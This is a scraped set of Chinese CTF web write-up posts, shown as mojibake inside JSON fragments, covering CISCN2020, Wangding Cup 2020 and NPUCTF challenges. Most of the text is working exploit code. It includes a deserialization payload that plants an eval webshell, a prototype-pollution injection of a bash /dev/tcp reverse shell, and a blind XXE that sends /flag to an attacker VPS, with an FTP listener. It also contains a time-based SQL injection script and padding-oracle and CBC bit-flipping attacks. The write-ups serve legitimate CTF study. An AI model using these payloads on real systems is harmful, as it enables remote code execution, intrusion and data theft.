namespace ddd{ $a = new \\DB\\jig(\u0026#34;/var/www/html/\u0026#34;, [\u0026#34;kkk.php\u0026#34;=\u0026gt; [\u0026#39;\u0026lt;?php eval($_POST[1]);?\u0026gt;\u0026#39;]], True); echo urlencode(serialize($a)); } ?\u0026gt; littlegame javascriptåŸå‹é“¾æ±¡æŸ“\nå…³é”®ä»£ç \nrouter.post(\u0026#34;/DeveloperControlPanel\u0026#34;, function (req, res, next) { // not implement if (req.body.key === undefined || req.body.password === undefined){ res.send(\u0026#34;What\u0026#39;s your problem?\u0026#34;); }else { let key = req.body.key.toString(); let password = req.body.password.toString(); if(Admin[key] === password){ res.send(process.env.flag); }else { res.send(\u0026#34;Wrong password!Are you Admin?\u0026#34;); } } }); router.get(\u0026#39;/SpawnPoint\u0026#39;, function (req, res, next) { req.session.knight = { \u0026#34;HP\u0026#34;: 1000, \u0026#34;Gold\u0026#34;: 10, \u0026#34;Firepower\u0026#34;: 10 } res.send(\u0026#34;Let\u0026#39;s begin!\u0026#34;); }); router.post(\u0026#34;/Privilege\u0026#34;, function (req, res, next) { // Why not ask witch for help? if(req.session.knight === undefined){ res.redirect(\u0026#39;/SpawnPoint\u0026#39;); }else{ if (req.body.NewAttributeKey === undefined || req.body.NewAttributeValue === undefined) { res.send(\u0026#34;What\u0026#39;s your problem?\u0026#34;); }else { let key = req.body.NewAttributeKey.toString(); let value = req.body.NewAttributeValue.toString(); setFn(req.session.knight, key, value); res.send(\u0026#34;Let\u0026#39;s have a check!\u0026#34;); } } }); æ±¡æŸ“req.session.knight\nexpå¦‚ä¸‹\nimport requests url = \u0026#34;http://eci-2ze9505q64pi24hxhzqj.cloudeci1.ichunqiu.com:8888/\u0026#34; data1 = { \u0026#34;NewAttributeKey\u0026#34;:\u0026#34;constructor.prototype.ch3n9w\u0026#34;, \u0026#34;NewAttributeValue\u0026#34;:\u0026#34;1234\u0026#34; } data2 = { \u0026#34;key\u0026#34;:\u0026#39;ch3n9w\u0026#39;, \u0026#39;password\u0026#39;:\u0026#39;1234\u0026#39; } sess = requests.Session() sess.get(url+\u0026#34;SpawnPoint\u0026#34;) sess.post(url+\u0026#34;Privilege\u0026#34;,data=data1) r = sess.post(url+\u0026#34;DeveloperControlPanel\u0026#34;,data=data2) print(r.text) rceme æœç´¢å‘ç°https://www.anquanke.com/post/id/212603#h2-0, æ‹¿ç€payloadç›´æ¥æ‰“å°±å¯ä»¥äº†\neasytrick \u0026lt;?php class trick{ public $trick1; public $trick2; public function __construct($a, $b) { $this-\u0026gt;trick1 = $a; $this-\u0026gt;trick2 = $b; } public function __destruct(){ $this-\u0026gt;trick1 = (string)$this-\u0026gt;trick1; if(strlen($this-\u0026gt;trick1) \u0026gt; 5 || strlen($this-\u0026gt;trick2) \u0026gt; 5){ die(\u0026#34;ä½ å¤ªé•¿äº†\u0026#34;); } if($this-\u0026gt;trick1 !== $this-\u0026gt;trick2 \u0026amp;\u0026amp; md5($this-\u0026gt;trick1) === md5($this-\u0026gt;trick2) \u0026amp;\u0026amp; $this-\u0026gt;trick1 != $this-\u0026gt;trick2){ echo file_get_contents(\u0026#34;/flag\u0026#34;); } } } $a = new trick(INF, INF); echo urlencode(serialize($a)); ","permalink":"https://dragonbox.top/posts/ctf-ciscn2020-online/","summary":"\u003cblockquote\u003e\n\u003cp\u003ewebè¶Šä¾†è¶Šæ²¡æœ‰ç‰Œé¢äº†\u0026hellip;å›½èµ›æœç„¶æ˜¯pwnå’Œmiscçš„å¤©ä¸‹\u003c/p\u003e\n\u003c/blockquote\u003e","title":"ciscn2020_online"},{"content":"filejava æä¾›äº†æ–‡ä»¶ä¸Šä¼ å’Œä¸‹è½½çš„åŠŸèƒ½, åœ¨ä¸‹è½½åŠŸèƒ½é‚£é‡Œæˆ‘ä»¬å¯ä»¥ä»»æ„æ–‡ä»¶è¯»å–, é€šè¿‡æŠŠæ–‡ä»¶åæ¢æˆæ–‡ä»¶å¤¹åå­—å¯ä»¥åœ¨æŠ¥é”™ä¸­çˆ†å‡ºç»å¯¹è·¯å¾„, å¦‚å›¾:\nç»å¯¹è·¯å¾„\n/usr/local/tomcat/webapps/ROOT/WEB-INF/upload/0/10/ è¯»æ–‡ä»¶/etc/passwd\nè¯»æ—¥å¿—æ–‡ä»¶ logs/catalina.out\nâ€‹ å‘ç°æœ‰ä¸€ä¸ªwaråŒ…,ä¸‹è½½ä¸‹æ¥è¿›è¡Œæºç å®¡è®¡, å‘ç°ä¸€å¤„çªå…€çš„åœ°æ–¹\nif (filename.startsWith(\u0026#34;excel-\u0026#34;) \u0026amp;\u0026amp; \u0026#34;xlsx\u0026#34;.equals(fileExtName)) try { Workbook wb1 = WorkbookFactory.create(in); Sheet sheet = wb1.getSheetAt(0); System.out.println(sheet.getFirstRowNum()); } catch (InvalidFormatException e) { System.err.println(\u0026#34;poi-ooxml-3.10 has something wrong\u0026#34;); e.printStackTrace(); } è¿™é‡Œä¼šå¯¹exceå¼€å¤´è€Œä¸”åç¼€åä¸ºxlsxçš„æ–‡ä»¶è¿›è¡Œä¸€ä¸ªè§£æ, è€ƒè™‘ä¸€ä¸‹ä½¿ç”¨xlsxæ¥è¿›è¡Œblind xxe, å…·ä½“å¯ä»¥å‚è€ƒ https://www.jishuwen.com/d/2inW/zh-hk\næ–°å»ºä¸€ä¸ªxlsxæ–‡æ¡£, è§£å‹, ä¿®æ”¹Content_Types.xmlçš„å†…å®¹ä¸º\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE r [ \u0026lt;!ENTITY % data3 SYSTEM \u0026#34;file:///flag\u0026#34;\u0026gt; \u0026lt;!ENTITY % sp SYSTEM \u0026#34;http://vps/ext.dtd\u0026#34;\u0026gt; %sp; %param3; %exfil; ]\u0026gt; åœ¨vpsä¸Šçš„webç›®å½•ä¸‹é¢æ”¾ç½®ä¸€ä¸ªext.dtd, å†…å®¹å¦‚ä¸‹:\n\u0026lt;!ENTITY % param3 \u0026#34;\u0026lt;!ENTITY \u0026amp;#37; exfil SYSTEM \u0026#39;ftp://vps/%data3;\u0026#39;\u0026gt;\u0026#34;\u0026gt; vpsä¸Šå¼€å¯ftpç›‘å¬è„šæœ¬, è„šæœ¬å¦‚ä¸‹\n#!/usr/env/python from __future__ import print_function import socket s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) s.bind((\u0026#39;0.0.0.0\u0026#39;,21)) s.listen(1) print(\u0026#39;XXE-FTP listening \u0026#39;) conn,addr = s.accept() print(\u0026#39;Connected by %s\u0026#39;,addr) conn.sendall(\u0026#39;220 Staal XXE-FTP\\r\\n\u0026#39;) stop = False while not stop: dp = str(conn.recv(1024)) if dp.find(\u0026#34;USER\u0026#34;) \u0026gt; -1: conn.sendall(\u0026#34;331 password please - version check\\r\\n\u0026#34;) else: conn.sendall(\u0026#34;230 more data please!\\r\\n\u0026#34;) if dp.find(\u0026#34;RETR\u0026#34;)==0 or dp.find(\u0026#34;QUIT\u0026#34;)==0: stop = True if dp.find(\u0026#34;CWD\u0026#34;) \u0026gt; -1: print(dp.replace(\u0026#39;CWD \u0026#39;,\u0026#39;/\u0026#39;,1).replace(\u0026#39;\\r\\n\u0026#39;,\u0026#39;\u0026#39;),end=\u0026#39;\u0026#39;) else: print(dp) conn.close() s.close() å°†ä¿®æ”¹å†…å®¹åçš„æ–‡æ¡£æ–‡ä»¶é‡æ–°å…¨éƒ¨å‹ç¼©æˆxlsxæ–‡æ¡£, å‘é€, vpsæœ‰å›æ˜¾\næ³¨æ„, ç›´æ¥nc 21ç«¯å£ä¸ä¼šçœ‹åˆ°æ•°æ®, è‡³äºä¸ºä»€ä¹ˆä»¥åå†ç ”ç©¶ä¸€ä¸‹\nnotes æºç \nvar express = require(\u0026#39;express\u0026#39;); var path = require(\u0026#39;path\u0026#39;); const undefsafe = require(\u0026#39;undefsafe\u0026#39;); const { exec } = require(\u0026#39;child_process\u0026#39;); var app = express(); class Notes { constructor() { this.owner = \u0026#34;whoknows\u0026#34;; this.num = 0; this.note_list = {}; } write_note(author, raw_note) { this.note_list[(this.num++).toString()] = {\u0026#34;author\u0026#34;: author,\u0026#34;raw_note\u0026#34;:raw_note}; } get_note(id) { var r = {} undefsafe(r, id, undefsafe(this.note_list, id)); return r; } edit_note(id, author, raw) { undefsafe(this.note_list, id + \u0026#39;.author\u0026#39;, author); undefsafe(this.note_list, id + \u0026#39;.raw_note\u0026#39;, raw); } get_all_notes() { return this.note_list; } remove_note(id) { delete this.note_list[id]; } } var notes = new Notes(); notes.write_note(\u0026#34;nobody\u0026#34;, \u0026#34;this is nobody\u0026#39;s first note\u0026#34;); app.set(\u0026#39;views\u0026#39;, path.join(__dirname, \u0026#39;views\u0026#39;)); app.set(\u0026#39;view engine\u0026#39;, \u0026#39;pug\u0026#39;); app.use(express.json()); app.use(express.urlencoded({ extended: false })); app.use(express.static(path.join(__dirname, \u0026#39;public\u0026#39;))); app.get(\u0026#39;/\u0026#39;, function(req, res, next) { res.render(\u0026#39;index\u0026#39;, { title: \u0026#39;Notebook\u0026#39; }); }); app.route(\u0026#39;/add_note\u0026#39;) .get(function(req, res) { res.render(\u0026#39;mess\u0026#39;, {message: \u0026#39;please use POST to add a note\u0026#39;}); }) .post(function(req, res) { let author = req.body.author; let raw = req.body.raw; if (author \u0026amp;\u0026amp; raw) { notes.write_note(author, raw); res.render(\u0026#39;mess\u0026#39;, {message: \u0026#34;add note sucess\u0026#34;}); } else { res.render(\u0026#39;mess\u0026#39;, {message: \u0026#34;did not add note\u0026#34;}); } }) app.route(\u0026#39;/edit_note\u0026#39;) .get(function(req, res) { res.render(\u0026#39;mess\u0026#39;, {message: \u0026#34;please use POST to edit a note\u0026#34;}); }) .post(function(req, res) { let id = req.body.id; let author = req.body.author; let enote = req.body.raw; if (id \u0026amp;\u0026amp; author \u0026amp;\u0026amp; enote) { notes.edit_note(id, author, enote); res.render(\u0026#39;mess\u0026#39;, {message: \u0026#34;edit note sucess\u0026#34;}); } else { res.render(\u0026#39;mess\u0026#39;, {message: \u0026#34;edit note failed\u0026#34;}); } }) app.route(\u0026#39;/delete_note\u0026#39;) .get(function(req, res) { res.render(\u0026#39;mess\u0026#39;, {message: \u0026#34;please use POST to delete a note\u0026#34;}); }) .post(function(req, res) { let id = req.body.id; if (id) { notes.remove_note(id); res.render(\u0026#39;mess\u0026#39;, {message: \u0026#34;delete done\u0026#34;}); } else { res.render(\u0026#39;mess\u0026#39;, {message: \u0026#34;delete failed\u0026#34;}); } }) app.route(\u0026#39;/notes\u0026#39;) .get(function(req, res) { let q = req.query.q; let a_note; if (typeof(q) === \u0026#34;undefined\u0026#34;) { a_note = notes.get_all_notes(); } else { a_note = notes.get_note(q); } res.render(\u0026#39;note\u0026#39;, {list: a_note}); }) app.route(\u0026#39;/status\u0026#39;) .get(function(req, res) { let commands = { \u0026#34;script-1\u0026#34;: \u0026#34;uptime\u0026#34;, \u0026#34;script-2\u0026#34;: \u0026#34;free -m\u0026#34; }; for (let index in commands) { exec(commands[index], {shell:\u0026#39;/bin/bash\u0026#39;}, (err, stdout, stderr) =\u0026gt; { if (err) { return; } console.log(`stdout: ${stdout}`); }); } res.send(\u0026#39;OK\u0026#39;); res.end(); }) app.use(function(req, res, next) { res.status(404).send(\u0026#39;Sorry cant find that!\u0026#39;); }); app.use(function(err, req, res, next) { console.error(err.stack); res.status(500).send(\u0026#39;Something broke!\u0026#39;); }); const port = 8080; app.listen(port, () =\u0026gt; console.log(`Example app listening at http://localhost:${port}`)) undefsafeè¿™ä¸ªåº“å­˜åœ¨åŸå‹é“¾æ±¡æŸ“æ¼æ´, å…·ä½“è§é“¾æ¥https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940\nç„¶åçœ‹åˆ°statusé‚£é‡Œå­˜åœ¨å‘½ä»¤æ‰§è¡Œ, é‚£ä¹ˆæ€è·¯å°±æ˜¯æ±¡æŸ“commands, è®©å…¶ä¸­æœ‰æˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„å‘½ä»¤\npayload\nPOST /edit_note HTTP/1.1 {\u0026#34;id\u0026#34;:\u0026#34;__proto__\u0026#34;,\u0026#34;author\u0026#34;:\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/xxx/xxx 0\u0026gt;\u0026amp;1\u0026#34;,\u0026#34;raw\u0026#34;:\u0026#34;aaa\u0026#34;} è®°å¾—è¦æŠŠcontenttypeæ”¹æˆapplication/json, ç„¶åè®¿é—®ä¸€ä¸‹statuså°±å¯ä»¥è·å¾—åå¼¹shelläº†.\ntrace è„šæœ¬è·‘ç€è·‘ç€ç¯å¢ƒå°±å´©æ‰äº†, ç¯å¢ƒä¸å¤ªç¨³å®š, ä¸å¾—ä¸æ”¹æˆäºŒåˆ†æ³•å‡å°‘è¯·æ±‚æ•°é‡ä¹‹åæ‰æŠŠflagä¸€æ¬¡æ€§è·‘å‡ºæ¥äº†\nimport requests import time url = \u0026#34;http://3039266414b24d4a9f755321e1184a5548ffce8270ee4588.changame.ichunqiu.com/register_do.php\u0026#34; flag = \u0026#34;\u0026#34; index = 1 while True: u_bound = 255; l_bound=0; while u_bound \u0026gt;= l_bound: m_bound = (u_bound + l_bound) // 2 payload = \u0026#34;2\u0026#39;^if(ascii(substr((select `2` from (select 1,2 union select * from flag)a limit 1,1),{0},1))\u0026gt;{1},sleep(3),1),\u0026#39;1\u0026#39;)#\u0026#34;.format(index, m_bound) data = { \u0026#39;username\u0026#39;:payload, \u0026#39;password\u0026#39;:\u0026#39;hello\u0026#39; } print(data) t1 = time.time() res = requests.post(url, data=data) t2 = time.time() if t2 - t1 \u0026gt; 3: l_bound = m_bound + 1 else: u_bound = m_bound - 1 tmp = m_bound flag += chr(tmp) print(flag) index += 1 AreUSerialz é¢˜ç›®æºç \n\u0026lt;?php include(\u0026#34;flag.php\u0026#34;); highlight_file(__FILE__); class FileHandler { protected $op; protected $filename; protected $content; function __construct() { $op = \u0026#34;1\u0026#34;; $filename = \u0026#34;/tmp/tmpfile\u0026#34;; $content = \u0026#34;Hello World!\u0026#34;; $this-\u0026gt;process(); } public function process() { if($this-\u0026gt;op == \u0026#34;1\u0026#34;) { $this-\u0026gt;write(); } else if($this-\u0026gt;op == \u0026#34;2\u0026#34;) { $res = $this-\u0026gt;read(); $this-\u0026gt;output($res); } else { $this-\u0026gt;output(\u0026#34;Bad Hacker!\u0026#34;); } } private function write() { if(isset($this-\u0026gt;filename) \u0026amp;\u0026amp; isset($this-\u0026gt;content)) { if(strlen((string)$this-\u0026gt;content) \u0026gt; 100) { $this-\u0026gt;output(\u0026#34;Too long!\u0026#34;); die(); } $res = file_put_contents($this-\u0026gt;filename, $this-\u0026gt;content); if($res) $this-\u0026gt;output(\u0026#34;Successful!\u0026#34;); else $this-\u0026gt;output(\u0026#34;Failed!\u0026#34;); } else { $this-\u0026gt;output(\u0026#34;Failed!\u0026#34;); } } private function read() { $res = \u0026#34;\u0026#34;; if(isset($this-\u0026gt;filename)) { $res = file_get_contents($this-\u0026gt;filename); } return $res; } private function output($s) { echo \u0026#34;[Result]: \u0026lt;br\u0026gt;\u0026#34;; echo $s; } function __destruct() { if($this-\u0026gt;op === \u0026#34;2\u0026#34;) $this-\u0026gt;op = \u0026#34;1\u0026#34;; $this-\u0026gt;content = \u0026#34;\u0026#34;; $this-\u0026gt;process(); } } function is_valid($s) { for($i = 0; $i \u0026lt; strlen($s); $i++) if(!(ord($s[$i]) \u0026gt;= 32 \u0026amp;\u0026amp; ord($s[$i]) \u0026lt;= 125)) return false; return true; } if(isset($_GET{\u0026#39;str\u0026#39;})) { $str = (string)$_GET[\u0026#39;str\u0026#39;]; if(is_valid($str)) { $obj = unserialize($str); } } è¿™ä¸ªé¢˜ç›®è¦æ±‚æˆ‘ä»¬ä¼ å…¥çš„payloadä¸­ä¸å¯ä»¥æœ‰ä¸å¯è§å­—ç¬¦, ä½†æ˜¯ä¼—æ‰€å‘¨çŸ¥, protectedå±æ€§åœ¨åºåˆ—åŒ–ä¹‹åæ˜¯ä¼šå¸¦ä¸Šä¸å¯è§å­—ç¬¦çš„, é‚£è¯¥æ€ä¹ˆåŠå‘¢? å…¶å®åœ¨phpé«˜ç‰ˆæœ¬ä¸­, å¯¹å˜é‡çš„ç±»å‹æ”¾å®½äº†é™åˆ¶, ä¹Ÿå°±æ˜¯è¯´, å°±ç®—æŠŠprotectedå±æ€§æ”¹æˆpublicå±æ€§åæ„é€ payloadä¼ å…¥ä¹Ÿæ˜¯å¯ä»¥æ­£å¸¸è§£æçš„, è‡³äºè¦è®©opç­‰äº\u0026quot;2\u0026quot;çš„é™åˆ¶, åªè¦åˆ©ç”¨ä¸€ä¸‹phpå¼±ç±»å‹æ¯”è¾ƒ, è®©opç­‰äºæ•°å­—2å°±è¡Œ.\nçœ‹Y1ngå¸ˆå‚…çš„wp https://www.gem-love.com/websecurity/2322.html?tdsourcetag=s_pctim_aiomsg ä¸­æåˆ°äº†\nçœ‹çœ‹pç¥åœ¨çŸ¥è¯†æ˜Ÿçƒä¸­è¯´çš„å°±æ˜ç™½äº†\n","permalink":"https://dragonbox.top/posts/ctf-%E7%BD%91%E9%BC%8E%E6%9D%AF2020/","summary":"\u003ch2 id=\"filejava\"\u003efilejava\u003c/h2\u003e\n\u003cp\u003eæä¾›äº†æ–‡ä»¶ä¸Šä¼ å’Œä¸‹è½½çš„åŠŸèƒ½, åœ¨ä¸‹è½½åŠŸèƒ½é‚£é‡Œæˆ‘ä»¬å¯ä»¥ä»»æ„æ–‡ä»¶è¯»å–, é€šè¿‡æŠŠæ–‡ä»¶åæ¢æˆæ–‡ä»¶å¤¹åå­—å¯ä»¥åœ¨æŠ¥é”™ä¸­çˆ†å‡ºç»å¯¹è·¯å¾„, å¦‚å›¾:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/images/image-20200511193913736.png\" alt=\"image-20200511193913736\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eç»å¯¹è·¯å¾„\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e/usr/local/tomcat/webapps/ROOT/WEB-INF/upload/0/10/\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eè¯»æ–‡ä»¶/etc/passwd\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/images/image-20200511194357766.png\" alt=\"image-20200511194357766\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eè¯»æ—¥å¿—æ–‡ä»¶ \u003ccode\u003elogs/catalina.out\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003eâ€‹        \u003cimg loading=\"lazy\" src=\"/images/qBJnenyW6ts6Vglb.png__thumbnail\" alt=\"img\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eå‘ç°æœ‰ä¸€ä¸ªwaråŒ…,ä¸‹è½½ä¸‹æ¥è¿›è¡Œæºç å®¡è®¡, å‘ç°ä¸€å¤„çªå…€çš„åœ°æ–¹\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e        if (filename.startsWith(\u0026#34;excel-\u0026#34;) \u0026amp;\u0026amp; \u0026#34;xlsx\u0026#34;.equals(fileExtName))\n          try {\n            Workbook wb1 = WorkbookFactory.create(in);\n            Sheet sheet = wb1.getSheetAt(0);\n            System.out.println(sheet.getFirstRowNum());\n          } catch (InvalidFormatException e) {\n            System.err.println(\u0026#34;poi-ooxml-3.10 has something wrong\u0026#34;);\n            e.printStackTrace();\n          }  \n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eè¿™é‡Œä¼šå¯¹exceå¼€å¤´è€Œä¸”åç¼€åä¸ºxlsxçš„æ–‡ä»¶è¿›è¡Œä¸€ä¸ªè§£æ, è€ƒè™‘ä¸€ä¸‹ä½¿ç”¨xlsxæ¥è¿›è¡Œblind xxe, å…·ä½“å¯ä»¥å‚è€ƒ \u003ca href=\"https://www.jishuwen.com/d/2inW/zh-hk\"\u003ehttps://www.jishuwen.com/d/2inW/zh-hk\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eæ–°å»ºä¸€ä¸ªxlsxæ–‡æ¡£, è§£å‹, ä¿®æ”¹\u003ccode\u003eContent_Types.xml\u003c/code\u003eçš„å†…å®¹ä¸º\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-xml\" data-lang=\"xml\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u0026lt;!DOCTYPE r [\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u0026lt;!ENTITY % data3 SYSTEM \u0026#34;file:///flag\u0026#34;\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u0026lt;!ENTITY % sp SYSTEM \u0026#34;http://vps/ext.dtd\u0026#34;\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e%sp;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e%param3;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e%exfil;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e]\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eåœ¨vpsä¸Šçš„webç›®å½•ä¸‹é¢æ”¾ç½®ä¸€ä¸ª\u003ccode\u003eext.dtd\u003c/code\u003e, å†…å®¹å¦‚ä¸‹:\u003c/p\u003e","title":"ç½‘é¼æ¯2020 web"},{"content":"padding oracle åŸç†: https://www.freebuf.com/articles/database/150606.html\n[NPUCTF2020]webç‹— æ‰“å¼€æ¥çœ‹åˆ°äº†æºä»£ç \n\u0026lt;?php error_reporting(0); include(\u0026#39;config.php\u0026#39;); # $key,$flag define(\u0026#34;METHOD\u0026#34;, \u0026#34;aes-128-cbc\u0026#34;); //å®šä¹‰åŠ å¯†æ–¹å¼ define(\u0026#34;SECRET_KEY\u0026#34;, $key); //å®šä¹‰å¯†é’¥ define(\u0026#34;IV\u0026#34;,\u0026#34;6666666666666666\u0026#34;); //å®šä¹‰åˆå§‹å‘é‡ 16ä¸ª6 define(\u0026#34;BR\u0026#34;,\u0026#39;\u0026lt;br\u0026gt;\u0026#39;); if(!isset($_GET[\u0026#39;source\u0026#39;]))header(\u0026#39;location:./index.php?source=1\u0026#39;); #var_dump($GLOBALS); //å¬è¯´ä½ æƒ³çœ‹è¿™ä¸ªï¼Ÿ function aes_encrypt($iv,$data) { echo \u0026#34;--------encrypt---------\u0026#34;.BR; echo \u0026#39;IV:\u0026#39;.$iv.BR; return base64_encode(openssl_encrypt($data, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)).BR; } function aes_decrypt($iv,$data) { return openssl_decrypt(base64_decode($data),METHOD,SECRET_KEY,OPENSSL_RAW_DATA,$iv) or die(\u0026#39;False\u0026#39;); } if($_GET[\u0026#39;method\u0026#39;]==\u0026#39;encrypt\u0026#39;) { $iv = IV; $data = $flag; echo aes_encrypt($iv,$data); } else if($_GET[\u0026#39;method\u0026#39;]==\u0026#34;decrypt\u0026#34;) { $iv = @$_POST[\u0026#39;iv\u0026#39;]; $data = @$_POST[\u0026#39;data\u0026#39;]; echo aes_decrypt($iv,$data); } echo \u0026#34;æˆ‘æ‘Šç‰Œäº†ï¼Œå°±æ˜¯æ‡’å¾—å†™å‰ç«¯\u0026#34;.BR; if($_GET[\u0026#39;source\u0026#39;]==1)highlight_file(__FILE__); ?\u0026gt; ä½¿ç”¨padding oracle attackæ¥è§£å‡ºæ˜æ–‡å†…å®¹, è¿™é‡Œæ¯”è¾ƒç®€å•, æ˜æ–‡é•¿åº¦ä»…ä»…åªæœ‰ä¸€ä¸ªåˆ†ç»„, åªéœ€è¦ä¿®æ”¹ivæ±‚å‡ºä¸­é—´å€¼ä¹‹åå’ŒåŸæ¥çš„ivè¿›è¡ŒæŠ‘æˆ–æ“ä½œå°±å¯ä»¥å¾—åˆ°æ˜æ–‡äº†, è„šæœ¬å¦‚ä¸‹\nimport base64 import requests import time url = \u0026#34;http://71a04ae9-0b21-46fd-a550-d1aa35a3619a.node3.buuoj.cn/index.php?method=decrypt\u0026amp;source=0\u0026#34; encrypt = \u0026#34;ly7auKVQCZWum/W/4osuPA==\u0026#34; enc = base64.b64decode(encrypt.encode(\u0026#34;utf8\u0026#34;)) iv = b\u0026#34;6666666666666666\u0026#34; get = \u0026#34;\u0026#34; for i in range(1, 17): for j in range(0,256): iv_tmp = chr(0)*(16-i) + chr(j) + \u0026#34;\u0026#34;.join([chr(ord(get[n]) ^ i) for n in range(len(get))]) data = { \u0026#39;iv\u0026#39;:iv_tmp, \u0026#39;data\u0026#39;:encrypt } res = requests.post(url,data=data) print(res.text) time.sleep(1.5) if \u0026#34;False\u0026#34; not in res.text: get = chr(j ^ i)+ get print(get) print(base64.b64encode(get.encode(\u0026#34;utf8\u0026#34;))) break print(base64.b64encode(get.encode(\u0026#34;utf8\u0026#34;))) å¾—åˆ°äº†ä¸€ä¸ªåœ°å€, è®¿é—®ä¹‹å‘ç°ä¸‹ä¸€ä¸ªé—®é¢˜è€ƒå¯Ÿcbcå­—èŠ‚ç¿»è½¬æ”»å‡»,é¢˜ç›®å¦‚ä¸‹\n\u0026lt;?php #error_reporting(0); include(\u0026#39;config.php\u0026#39;); //$fl4g define(\u0026#34;METHOD\u0026#34;, \u0026#34;aes-128-cbc\u0026#34;); define(\u0026#34;SECRET_KEY\u0026#34;, \u0026#34;6666666\u0026#34;); session_start(); function get_iv(){ //ç”Ÿæˆéšæœºåˆå§‹å‘é‡IV $random_iv=\u0026#39;\u0026#39;; for($i=0;$i\u0026lt;16;$i++){ $random_iv.=chr(rand(1,255)); } return $random_iv; } $lalala = \u0026#39;piapiapiapia\u0026#39;; if(!isset($_SESSION[\u0026#39;Identity\u0026#39;])){ $_SESSION[\u0026#39;iv\u0026#39;] = get_iv(); $_SESSION[\u0026#39;Identity\u0026#39;] = base64_encode(openssl_encrypt($lalala, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $_SESSION[\u0026#39;iv\u0026#39;])); } echo base64_encode($_SESSION[\u0026#39;iv\u0026#39;]).\u0026#34;\u0026lt;br\u0026gt;\u0026#34;; if(isset($_POST[\u0026#39;iv\u0026#39;])){ $tmp_id = openssl_decrypt(base64_decode($_SESSION[\u0026#39;Identity\u0026#39;]), METHOD, SECRET_KEY, OPENSSL_RAW_DATA, base64_decode($_POST[\u0026#39;iv\u0026#39;])); echo $tmp_id.\u0026#34;\u0026lt;br\u0026gt;\u0026#34;; if($tmp_id ===\u0026#39;weber\u0026#39;)die($fl4g); } highlight_file(__FILE__); ?\u0026gt; è„šæœ¬, æ³¨æ„è¿™é‡Œéœ€è¦å°†å­—ç¬¦ä¸²è¡¥å…¨åˆ°16ä¸ªå­—èŠ‚\nimport base64 target = b\u0026#39;weber\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\u0026#39; orginal = b\u0026#39;piapiapiapia\\x04\\x04\\x04\\x04\u0026#39; iv = base64.b64decode(\u0026#34;JLSjjNcJ+cOULHUC0DhRSw==\u0026#34;) result = b\u0026#39;\u0026#39; for i in range(16): result += bytes([target[i] ^ iv[i] ^ orginal[i]]) print(base64.b64encode(result)) [CISCN2019 ä¸œåŒ—èµ›åŒº Day2 Web3]Point System æ‰“å¼€æ˜¯ä¸€ä¸ªç™»å½•ç•Œé¢, è®¿é—®robots.txt, å‘ç°ä¸€ä¸ªhtml, é‡Œé¢æ˜¯å¾ˆå¤šapi\nè¯•ç€æŒ‰ç…§é‡Œé¢çš„ä½¿ç”¨æ–¹æ³•æ¥æ³¨å†Œä¸€ä¸ªç”¨æˆ·, ç„¶åå›åˆ°ç™»å½•ç•Œé¢ç™»å½•æç¤ºæƒé™ä¸è¶³, çœ‹çœ‹æµè§ˆå™¨çš„network\né™¤äº†å‘loginå’Œinfoéƒ½è¯·æ±‚äº†ä¸€æ¬¡, 